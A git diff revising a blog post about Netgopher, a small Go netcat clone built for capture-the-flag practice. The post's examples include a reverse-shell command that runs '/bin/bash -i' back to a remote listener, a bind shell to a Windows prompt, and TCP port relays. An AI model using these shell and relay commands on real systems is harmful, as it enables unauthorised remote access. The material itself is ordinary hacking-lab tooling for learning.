@@ -16,7 +16,7 @@ date:   2021-01-30 21:00:00 +0000
 header:
   overlay_image: /assets/images/posts/netgopher/go.gif
   teaser: /assets/images/posts/netgopher/go.gif
-  caption: A very excellent animated gopher courtesy of [egonelbre](https://github.com/egonelbre) - Check them out, they're very nice!
+  caption: A very excellent animated gopher courtesy of [egonelbre](https://github.com/egonelbre).
 excerpt: "New tool who dis?"
 categories:
   - Labs & Hacking
@@ -50,33 +50,37 @@ a compilation/testing command that's almost as simple as developing a Python
 script.  
 
 I'd suggest that working with Go like this is probably going to be a bit easier 
-if you are comfortable working with Bash or maybe a little bit of Python (even 
-just being able to read these will be enough), but don't let that hold you back 
-if you're keen.  I've gone through the first chapter or two so far and in just 
-a couple of evenings, the book has guided me through some really nice simple TCP 
-tooling. 
+if you are familiar with some scripting or programming, even if it's just some 
+simple usages or concepts, like variables, bits and bytes and so on. If you're
+comfortable working with Bash or maybe a little bit of Python (even just being 
+able to read these) you'll have a great start. but don't let that hold you back 
+if you're keen! I've gone through the first chapter or two so far and in just 
+a couple of evenings, the book has guided me through some really nice conepts
+in such a simple way.
 
 Most of my exposure to compiled languages comes from solving awkward Mathematical
- problems at Univeristy, so learning Go was a little outfacing because I wanted
+problems at Univeristy, so learning Go was a little outfacing because I wanted
 to avoid that again. So far it's been nothing like that, it's giving me serious 
 Python vibes in the ease of drafting, testing and availability/usability of 
-(mostly core) Libraries, I think I might be a convert! If you're worried about 
-the learning curve, you could always get the basic syntax and conventions down 
-via Codeacademy, Sololearn etc.
+(mostly core) Libraries. I think I might be a convert! 
+
+With all that said, If you're worried about the learning curve, you could always 
+get the basic syntax and conventions down via Codeacademy, Sololearn etc. it's 
+atually really begineer friendly and you should **just do it!**
 
 # Netgopher
 
-Enter Netgopher. *What is that?* I hear you cry? Well to be honest, it's the same 
-example Netcat mimic that every person starting on Black Hat Go or Black Hat 
+Enter Netgopher. *'What is that?'* I hear you cry? Well to be honest, it's the same 
+example Netcat mimic (ish) that every person starting on Black Hat Go or Black Hat 
 Python (Another No Starch belter) puts on their Github. That said, I've tried 
-to make my super simple implementation of Netcat a bit more useful for myself
+to make this super simple implementation of Netcat a bit more useful for myself
 as I work CTFs and so on. 
 
 In addition to the usual example TCP connection functionality, I've Googled it 
 up and added some better command line parsing and options goodness, whilst most 
 of the Netcat 'extra features' (hexdump, UDP etc.) are not included, you can do 
 enough to get by on simple HackTheBox/TryHackMe/VulnHub boxes with TCP 
-connections, command execution and built-in  port relaying (best bit IMHO). 
+connections, command execution and built-in  port relaying (my personal fave!). 
 
 {% include figure
 image_path="/assets/images/posts/netgopher/relay.gif"
@@ -94,7 +98,7 @@ to check that out too if you know where you're going from here.
 
 # Installation
 
-You can **but probably shouldn't**  get Netgopher by running the following 
+You can, **but probably shouldn't**, get Netgopher by running the following 
 command once you have Go installed:
 
 ```
@@ -103,13 +107,14 @@ command once you have Go installed:
 
 ## Why not? 
 
-Well installing this way will only install ng in your local $GOPATH; 
+Well installing via *go get* will only install ng in your local $GOPATH; 
 additionally, the binary will be fairly large and compiled only for your OS. 
 
 I wrote this little application with CTFs in mind, meaning I want a smaller 
-binary, preferably with multi-platform support, so... **grab a copy of all the 
+binary (to move around the network quickly), preferably with multi-platform 
+support, so I can hack on Windows, Linux and more. So... **grab a copy of all the 
 [released binaries](https://github.com/Blackfell/ng/releases/tag/v0.1) instead**
-, which have been cross compileed and stripped down to ~ 2MB. 
+, which have been cross compiled and stripped down to ~ 2MB. 
 
 # Examples
 
@@ -139,14 +144,14 @@ the same host." %}
 
 ## CTF Use Cases
 Some really common use cases I have are:
-### Start an interactive Bash shell and connect back to a remote listener:
+### Start a shell and connect back to a remote listener
 ```
 # Start a listener on your remote machine
 ❯ ng -l 1234
 # Start the shell
 ❯ ng -c remote_host:1234 -e '/bin/bash -i'
 ```
-### Start a shell on a bind listener.
+### Start a shell on a bind listener
 This is useful in certail cases because you can create as many conenctions 
 as you like - if your shell drops, just re-connect.
 ```
@@ -155,12 +160,12 @@ as you like - if your shell drops, just re-connect.
 ❯ ng -c serving_host:1234
 C:\Windowss\system32>
 ^C
-# Oh no! Your shell dropped - try again:
+# Oh no! Your shell dropped - try again
 ❯ ng -c serving_host:1234
 C:\Windowss\system32>
 
 ```
-### Forward a TCP port back to a remote listener:
+### Forward a TCP port back to a remote listener
 ```
 # Start a relay on your local host
 ❯ ng -l 1234 -l 445
@@ -168,7 +173,7 @@ C:\Windowss\system32>
 ❯ ng -c local_hostname:1234 -c 127.0.0.1:445
 # Your local machine now has access to that remote port 445 on 127.0.0.1:445
 ```
-### Port 'spoofing' - Forward incoming connections to local port:
+### Port 'spoofing' - Forward connections to another port
 ```
 # Listen on port 1234 and forward connections to ssh server
 ❯ ng -l 1234 -c 127.0.0.1:22
